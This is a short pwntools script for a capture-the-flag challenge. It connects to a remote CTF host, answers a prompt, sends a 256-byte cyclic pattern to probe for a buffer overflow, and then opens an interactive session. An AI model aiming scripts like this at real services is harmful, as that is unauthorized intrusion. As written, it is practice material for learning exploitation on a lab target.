from pwn import *
context(arch = 'amd64',os = 'linux',log_level = 'debug')
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28292)
io.sendline('Yes')
payload = cyclic(0x100)
io.sendline(payload)
io.interactive()
